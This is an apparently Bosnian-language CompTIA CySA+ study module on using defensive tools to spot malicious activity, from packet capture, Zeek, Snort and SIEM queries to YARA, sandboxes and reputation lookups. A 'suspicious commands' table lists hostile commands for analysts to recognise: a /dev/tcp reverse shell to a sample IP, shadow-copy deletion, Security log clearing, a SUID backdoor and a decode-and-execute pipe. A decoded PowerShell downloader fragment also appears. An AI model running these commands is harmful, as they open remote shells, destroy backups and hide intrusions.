## Cilj ispita: 1.3

- **1.3** Given a scenario, use tools to determine malicious activity: dekodiranje (CyberChef), analiza paketa (Wireshark, tcpdump, Snort, Suricata, Zeek), SIEM, threat intelligence platforme (OTX, MISP, OpenCTI), EDR/XDR i MDM, reputacija domena i IP adresa (WHOIS, AbuseIPDB, GeoIP), analiza fajlova (strings, VirusTotal, YARA), sandbox (Joe Sandbox, Cuckoo), regularni izrazi i tumačenje sumnjivih komandi, analiza e-pošte (MXToolbox), UEBA (OpenUBA), formati JSON/XML/YAML/EVTX i skripte (Python, PowerShell, shell).

Nakon ovog modula trebalo bi da znaš:

- za dati zadatak izabrati pravi alat (i reći zašto drugi nisu najbolji);
- čitati izlaz tcpdump-a, tshark-a, Suricata/Zeek logova, `strings` i YARA pravila;
- bezbjedno dekodirati i protumačiti obfuskovane komande;
- provjeriti reputaciju domena, IP adrese, fajla i poruke;
- prepoznati format podataka i alat kojim ga parsiraš (jq, PowerShell, Python).

CompTIA voli PBQ u kojem dobiješ log ili pcap i biraš alat ili zaključak. Ključ je znati **šta koji alat radi i šta ne radi**. Ovdje ne učiš napad, nego kako da alatima potvrdiš ili odbaciš sumnju.

## Mapa alata

| Zadatak | Alat | Ne miješaj sa |
|---|---|---|
| Dekodirati Base64, URL, hex, XOR, gzip | **CyberChef** | VirusTotal (reputacija, ne dekodiranje) |
| Pregledati pakete sa GUI-jem i follow stream | **Wireshark** | tcpdump (CLI, snimanje) |
| Snimiti saobraćaj na serveru bez GUI-ja | **tcpdump** / tshark | Zeek (ne snima sirove pakete po defaultu) |
| Detekcija potpisima u mreži (IDS/IPS) | **Snort**, **Suricata** | Zeek (metapodaci, ne inline blokiranje) |
| Logovi o konekcijama, DNS, HTTP, TLS, fajlovima | **Zeek** | Snort (alarmi po pravilima) |
| Korelacija logova iz mnogo izvora | **SIEM** | EDR (samo endpoint) |
| Dijeljenje i upravljanje IoC-ima | **MISP**, **OpenCTI**, **OTX** | SIEM |
| Detekcija i odgovor na endpointu | **EDR**; preko više domena **XDR** | MDM (upravljanje uređajem) |
| Politike i stanje mobilnih uređaja | **MDM** | EDR |
| Vlasnik i datum registracije domena | **WHOIS** | GeoIP |
| Prijave zloupotrebe IP adrese | **AbuseIPDB** | WHOIS |
| Približna lokacija IP adrese | **GeoIP** | AbuseIPDB |
| Čitljivi stringovi u binarnom fajlu | **strings** | YARA (pravila) |
| Rezultati više AV motora za hash | **VirusTotal** | sandbox |
| Pravila za prepoznavanje porodice malvera | **YARA** | Snort (mreža) |
| Posmatranje ponašanja pri izvršavanju | **Joe Sandbox**, **Cuckoo** | statička analiza |
| Analiza zaglavlja i DNS zapisa pošte | **MXToolbox** | VirusTotal |
| Odstupanja u ponašanju korisnika | **UEBA** (OpenUBA) | pravila sa fiksnim pragom |

## Dekodiranje i parsiranje: CyberChef

**CyberChef** (GCHQ) je web alat sa „receptima“ (lancima operacija): From Base64, URL Decode, From Hex, Gunzip, XOR, Decode text (UTF-16LE), Extract URLs/IPs, Defang. Radi lokalno u pregledaču, pa se može koristiti offline bez slanja uzorka trećoj strani.

Tipičan slučaj: PowerShell `-EncodedCommand` je Base64 nad **UTF-16LE** tekstom. Recept: `From Base64` → `Decode text (UTF-16LE)`. Isto u Linuxu:

```bash
$ echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' \
    | base64 -d | iconv -f UTF-16LE -t UTF-8
IEX (New-Object Net.WebClient)
```

> **Na ispitu:** Kada treba „deobfuskovati“ ili „dekodirati“ string (Base64, URL encoding, hex) da bi se vidjelo šta komanda radi, odgovor je **CyberChef**. VirusTotal daje reputaciju fajla/URL-a, a sandbox ponašanje pri izvršavanju.

## Analiza paketa

### tcpdump i tshark

`tcpdump` snima i filtrira pakete na komandnoj liniji (BPF filteri), `tshark` je Wireshark u terminalu sa display filterima.

```bash
# Snimi saobraćaj ka/od sumnjivog hosta u fajl (ring buffer 10 x 100 MB)
$ tcpdump -i eth0 -nn -w /cases/ir42/host77-%Y%m%d%H%M.pcap -C 100 -W 10 host 10.0.5.77

# Brzi pregled: samo SYN paketi
$ tcpdump -nn -r capture.pcap 'tcp[tcpflags] == tcp-syn' | head -3
09:02:11.104 IP 10.0.5.77.51544 > 10.0.1.20.22: Flags [S], seq 1180232, win 1024, length 0
09:02:11.104 IP 10.0.5.77.51544 > 10.0.1.20.80: Flags [S], seq 1180232, win 1024, length 0
09:02:11.105 IP 10.0.5.77.51544 > 10.0.1.20.443: Flags [S], seq 1180232, win 1024, length 0
```

Isti izvorni port, isti `seq` i `win 1024` za različite odredišne portove su tipičan otisak alata za skeniranje, ne običnog klijenta.

```bash
# Statistika razgovora i protokola
$ tshark -r capture.pcap -q -z conv,ip
$ tshark -r capture.pcap -q -z io,phs

# HTTP zahtjevi: host, URI, User-Agent
$ tshark -r capture.pcap -Y http.request -T fields -e ip.src -e http.host -e http.request.uri -e http.user_agent
10.0.4.15  update-check.example.net  /gate.php?id=4f1a  Mozilla/4.0 (compatible; MSIE 6.0)

# TLS SNI za šifrovan saobraćaj
$ tshark -r capture.pcap -Y "tls.handshake.type==1" -T fields -e ip.dst -e tls.handshake.extensions_server_name
```

Zastarjeli User-Agent (MSIE 6.0 u 2026.) i `gate.php` su česti indikatori malver C2 panela.

| BPF (tcpdump, capture filter) | Wireshark display filter |
|---|---|
| `host 10.0.5.77` | `ip.addr == 10.0.5.77` |
| `port 53` | `dns` ili `udp.port == 53` |
| `tcp[tcpflags] == tcp-syn` | `tcp.flags.syn == 1 && tcp.flags.ack == 0` |
| `src net 10.0.0.0/8 and dst port 443` | `ip.src == 10.0.0.0/8 && tcp.dstport == 443` |

### Wireshark

GUI za dubinsku analizu: **Follow TCP/HTTP stream** (rekonstrukcija razgovora), **Statistics → Conversations / Endpoints / Protocol Hierarchy**, **Export Objects → HTTP** (izvlačenje prenesenih fajlova za hash i analizu), Expert Info. Na ispitu je odgovor kada treba „rekonstruisati sesiju“ ili „izvući fajl iz pcap-a“.

### Snort i Suricata

Mrežni **IDS/IPS** zasnovani na pravilima. Snort je stariji, Suricata je višenitni i uz alarme generiše **EVE JSON** sa metapodacima protokola. Oba mogu raditi **inline (IPS)** i blokirati.

```text
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Sumnjiv stari User-Agent ka gate.php"; \
  flow:established,to_server; http.uri; content:"/gate.php"; http.user_agent; content:"MSIE 6.0"; \
  classtype:trojan-activity; sid:1000001; rev:1;)
```

```bash
$ jq -c 'select(.event_type=="alert") | {ts:.timestamp, src:.src_ip, dst:.dest_ip, sig:.alert.signature}' eve.json
{"ts":"2026-10-16T09:15:00Z","src":"10.0.4.15","dst":"198.51.100.23","sig":"Sumnjiv stari User-Agent ka gate.php"}
```

### Zeek

**Zeek** (ranije Bro) ne radi primarno po potpisima, nego pravi **strukturisane logove** o svemu što vidi: `conn.log`, `dns.log`, `http.log`, `ssl.log`, `files.log`, `x509.log`, `notice.log`. Odličan je za threat hunting i retrospektivnu analizu (npr. traženje beaconinga ili retkih JA3/JA4 otisaka).

```text
#fields ts          uid    id.orig_h  id.resp_h      id.resp_p proto service duration orig_bytes resp_bytes
1760605500.01  C8x1   10.0.4.15  198.51.100.23  443       tcp   ssl     0.31     402        1210
1760605560.02  C9a2   10.0.4.15  198.51.100.23  443       tcp   ssl     0.30     402        1210
```

> **Na ispitu:** **Snort/Suricata** = alarm ili blok kada saobraćaj odgovara pravilu (signature). **Zeek** = bogati metapodaci o svakoj konekciji za hunting i forenziku. **Wireshark** = ručna dubinska analiza jednog pcap-a. **tcpdump** = snimanje na serveru bez GUI-ja.

## SIEM i analiza logova

**SIEM** (Splunk, Elastic, Microsoft Sentinel, Wazuh, Graylog) prikuplja, normalizuje i korelira logove, pokreće pravila i čuva podatke za istrage. Kao u SC-200 kursu sa KQL-om, analitičar mora znati osnovne operacije upita: filtriranje, agregaciju, grupisanje po vremenu i spajanje izvora.

```text
# Splunk SPL: neuspjele pa uspješna prijava sa iste IP
index=wineventlog (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as fails count(eval(EventCode=4624)) as ok by src_ip, user
| where fails > 20 AND ok > 0
```

```text
// KQL (Sentinel): isto
SecurityEvent
| where EventID in (4624, 4625)
| summarize fails=countif(EventID==4625), ok=countif(EventID==4624) by IpAddress, Account
| where fails > 20 and ok > 0
```

SIEM nije isto što i SOAR (automatizacija odgovora, modul 5) ni EDR (dubinska telemetrija endpointa).

## Threat intelligence platforme

| Platforma | Šta je | Kada se bira |
|---|---|---|
| **OTX** (AlienVault/LevelBlue Open Threat Exchange) | Besplatna zajednica sa „pulse“ paketima IoC-a | Brza provjera da li je IoC poznat zajednici |
| **MISP** | Open-source platforma za dijeljenje IoC-a između organizacija (događaji, atributi, tagovi, TLP) | Razmjena sa ISAC-om i partnerima, sopstvena baza IoC-a |
| **OpenCTI** | Open-source platforma za strukturisano znanje o prijetnjama u **STIX 2.1** modelu (akteri, kampanje, TTP-ovi, veze) | Analiza veza aktor–kampanja–tehnika, izvještaji |

MISP i OpenCTI se često koriste zajedno: MISP za operativnu razmjenu indikatora, OpenCTI za kontekst i vezu sa ATT&CK-om. Obje izvoze feedove u SIEM i EDR. Više o samom threat intelu u modulu 4.

## Endpoint: EDR, XDR i MDM

- **EDR**: agent bilježi procese, konekcije, izmjene registra i fajlova; daje stablo procesa, izolaciju hosta, prikupljanje fajlova i memorije, ubijanje procesa (Defender for Endpoint, CrowdStrike, SentinelOne, Wazuh djelimično).
- **XDR**: korelira endpoint, identitet, e-poštu, cloud i mrežu u jedan incident (Defender XDR iz SC-200 kursa).
- **MDM**: upravlja mobilnim uređajima i daje stanje usklađenosti (rootovan, zastarjeli OS, nedostaje enkripcija), daljinsko zaključavanje i brisanje. Nije alat za dubinsku analizu procesa.

> **Na ispitu:** „Potrebno je vidjeti koji je proces otvorio konekciju i izolovati laptop od mreže uz zadržavanje veze sa konzolom“ → **EDR**. „Daljinski obrisati izgubljeni službeni telefon“ → **MDM**. „Spojiti alarm iz e-pošte, prijave i endpointa u jedan incident“ → **XDR**.

## Reputacija domena i IP adresa

```bash
$ whois cdn-sync.net | grep -Ei 'creation|registrar:|registrant country'
Creation Date: 2026-10-13T22:41:07Z        ← registrovan prije 3 dana
Registrar: NameCheap, Inc.
Registrant Country: IS
```

- **WHOIS**: registrar, datum kreiranja, kontakt (često skriven privacy servisom). **Novoregistrovan domen** je jak signal za phishing i C2.
- **AbuseIPDB**: zajednica prijavljuje zlonamjerne IP adrese; dobijaš **Abuse Confidence Score**, kategorije (SSH brute force, port scan) i broj prijava.
- **GeoIP**: približna lokacija i ASN. Korisno za impossible travel i geo-pravila, ali nepouzdano za VPN, Tor, mobilne i cloud adrese. Nije dokaz identiteta napadača.

## Analiza fajlova

### strings

```bash
$ strings -n 8 sample.bin | grep -Ei 'http|\.exe|cmd|powershell|HKEY' | head
http://198.51.100.23/gate.php
Software\Microsoft\Windows\CurrentVersion\Run
cmd.exe /c schtasks /create /tn Updater /tr
$ strings -el sample.bin | head    # UTF-16LE stringovi (česti u Windows binarnim fajlovima)
```

Brza statička trijaža: URL-ovi, IP adrese, ključevi registra, imena fajlova. Spakovan (packed) fajl daje malo smislenih stringova, što je samo po sebi indikator.

### VirusTotal

Provjera **hash-a** (SHA-256) protiv desetina AV motora, uz reputaciju URL-a, domena i IP-a i relacije. Pravilo: **prvo pretraži hash**, ne uploaduj povjerljiv fajl, jer je uzorak dostupan drugim korisnicima (i napadaču koji prati da li je otkriven).

```bash
$ sha256sum sample.bin
9f2c...e41a  sample.bin
```

### YARA

**YARA** pravila opisuju fajlove kroz stringove i uslove; koriste se za klasifikaciju malvera, hunting po diskovima i u sandboxima.

```text
rule Sumnjiv_Downloader
{
  meta:
    author = "SOC"
    description = "PowerShell downloader sa gate.php"
  strings:
    $a = "gate.php" ascii wide
    $b = "Net.WebClient" ascii wide nocase
    $c = { 4D 5A }   // MZ zaglavlje
  condition:
    $c at 0 and all of ($a, $b)
}
```

```bash
$ yara -r sumnjiv.yar /cases/ir42/files/
Sumnjiv_Downloader /cases/ir42/files/p.exe
```

> **Na ispitu:** **YARA** = pravila za **fajlove/memoriju**; **Snort/Suricata** = pravila za **mrežni saobraćaj**; **Sigma** (iz detection laba) = pravila za **logove**. Pitanje „napiši pravilo koje prepoznaje varijante iste porodice malvera na diskovima“ traži YARA.

## Sandboxing

**Sandbox** izvršava uzorak u izolovanoj, instrumentisanoj VM i bilježi ponašanje: kreirane procese, izmjene registra, fajlove, mrežne konekcije, DNS upite, snimke ekrana. **Joe Sandbox** je komercijalni (sa cloud verzijom), **Cuckoo** open-source (danas se održava kao CAPE/Cuckoo3). Ograničenja: malver koji prepoznaje VM ili čeka (sleep, provjera korisničke aktivnosti) može ostati „tih“, pa negativan rezultat nije dokaz da je fajl bezopasan.

| Statička analiza | Dinamička analiza |
|---|---|
| strings, hash, PE zaglavlje, YARA | Sandbox, praćenje procesa i mreže |
| Bezbjedna, brza | Pokazuje stvarno ponašanje |
| Obfuskacija i pakovanje je zavaraju | Malver može detektovati sandbox |

## Prepoznavanje obrazaca

### Regularni izrazi

Regex se koristi u SIEM upitima, grep-u, YARA i Snort pravilima. Ispitni primjeri:

| Regex | Šta hvata |
|---|---|
| `\b(?:\d{1,3}\.){3}\d{1,3}\b` | IPv4 adresu (gruba provjera) |
| `[A-Za-z0-9+/]{40,}={0,2}` | Dugačak Base64 niz |
| `\b[a-f0-9]{64}\b` | SHA-256 hash |
| `(?i)powershell.*-e(nc)?\s` | PowerShell sa enkodovanom komandom |
| `^[^@\s]+@[^@\s]+\.[a-z]{2,}$` | E-mail adresu |

```bash
$ grep -Eo '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' access.log | sort | uniq -c | sort -rn | head -3
   4120 203.0.113.45
    312 10.0.1.5
     40 192.0.2.10
```

### Tumačenje sumnjivih komandi

| Komanda (skraćeno) | Šta znači | Zašto sumnjivo |
|---|---|---|
| `powershell -nop -w hidden -enc JAB...` | Skriven prozor, bez profila, enkodovana komanda | Obfuskacija, izbjegavanje korisnika |
| `vssadmin delete shadows /all /quiet` | Brisanje shadow kopija | Ransomware priprema |
| `wevtutil cl Security` | Brisanje Security loga | Prikrivanje tragova |
| `schtasks /create /sc minute /mo 5 /tr C:\Users\Public\u.exe` | Zakazani zadatak svakih 5 min | Perzistencija |
| `net group "Domain Admins" /domain` | Lista domain admina | Izviđanje AD-a |
| `bash -i >& /dev/tcp/198.51.100.23/4444 0>&1` | Interaktivni shell preko TCP-a | Reverse shell |
| `echo ... \| base64 -d \| sh` | Dekodiranje i izvršavanje | Obfuskovan payload |
| `chmod +s /bin/bash` | SUID bit na shellu | Eskalacija privilegija, backdoor |

## Analiza e-pošte: MXToolbox

**MXToolbox** provjerava MX, SPF, DKIM i DMARC zapise domena, blackliste i analizira **zaglavlja poruke** (Received lanac, kašnjenja, rezultati autentikacije). Isti zapisi lokalno:

```bash
$ dig +short TXT corp.ba
"v=spf1 include:spf.protection.outlook.com -all"
$ dig +short TXT _dmarc.corp.ba
"v=DMARC1; p=reject; rua=mailto:dmarc@corp.ba"
```

Received zaglavlja se čitaju **odozdo nagore**: najdonje je prvi server koji je primio poruku od pošiljaoca.

## UEBA

**UEBA** (User and Entity Behavior Analytics) pravi profil ponašanja korisnika i entiteta (host, servisni nalog) i označava odstupanja: prijava u neuobičajeno vrijeme, pristup neobično velikom broju fajlova, prvi pristup osjetljivom serveru. **OpenUBA** je open-source UEBA okvir. Prednost u odnosu na fiksna pravila: hvata insajdere i ukradene kredencijale koji „izgledaju legitimno“.

## Formati podataka i skripte

| Format | Prepoznaješ po | Alat |
|---|---|---|
| **JSON** | `{"key": "value"}` (CloudTrail, EVE, većina API-ja) | `jq`, Python `json` |
| **XML** | `<Event><System>...` (Windows događaji, SAML, Nmap `-oX`) | `xmllint`, PowerShell `[xml]`, Python `ElementTree` |
| **YAML** | Uvlačenje, `key: value` (Kubernetes, Sigma, CI pipeline) | `yq`, Python `yaml` |
| **EVTX** | Binarni Windows event log | Event Viewer, `Get-WinEvent`, `wevtutil`, python-evtx, Chainsaw/Hayabusa |

```powershell
PS> Get-WinEvent -Path .\Security.evtx -FilterHashtable @{Id=4625} |
      Group-Object { $_.Properties[19].Value } | Sort-Object Count -Desc | Select -First 3 Count,Name
Count Name
----- ----
  812 203.0.113.45
```

```bash
$ jq -r '.Records[] | select(.eventName=="ConsoleLogin" and .responseElements.ConsoleLogin=="Failure") | .sourceIPAddress' ct.json | sort | uniq -c
     57 185.220.101.4
```

```python
import json, collections
c = collections.Counter()
for line in open("eve.json"):
    e = json.loads(line)
    if e.get("event_type") == "dns":
        c[e["dns"].get("rrname", "")] += 1
print(c.most_common(5))
```

> **Na ispitu:** Prepoznaj format po izgledu i izaberi odgovarajući alat: CloudTrail i Suricata EVE su **JSON** (jq), Sigma i Kubernetes manifesti su **YAML**, Windows log fajl je **EVTX** (Get-WinEvent). Skripta koja obrađuje logove u Windows okruženju je obično **PowerShell**, a na Linuxu **shell** ili **Python**.

## Rezime

- **CyberChef** dekodira, **VirusTotal** daje reputaciju, **sandbox** ponašanje, **strings** brzu statičku trijažu, **YARA** pravila nad fajlovima.
- **tcpdump** snima, **Wireshark** dubinski analizira i izvlači fajlove, **Snort/Suricata** alarmiraju ili blokiraju po potpisu, **Zeek** pravi metapodatke za hunting.
- **SIEM** korelira logove; upiti filtriraju, agregiraju i spajaju izvore.
- **MISP** za razmjenu IoC-a, **OpenCTI** za STIX znanje i veze, **OTX** za brzu provjeru u zajednici.
- **EDR** endpoint i izolacija, **XDR** više domena, **MDM** mobilni uređaji.
- **WHOIS** (starost domena), **AbuseIPDB** (prijave zloupotrebe), **GeoIP** (lokacija, nepouzdana uz VPN).
- **MXToolbox** za SPF/DKIM/DMARC i zaglavlja, **UEBA** za odstupanja ponašanja.
- Regex i tumačenje komandi (`-enc`, `vssadmin delete shadows`, `wevtutil cl`, `/dev/tcp`) su obavezna vještina.
- Formati: JSON (jq), XML, YAML, EVTX (Get-WinEvent); skripte u Pythonu, PowerShellu i shellu.
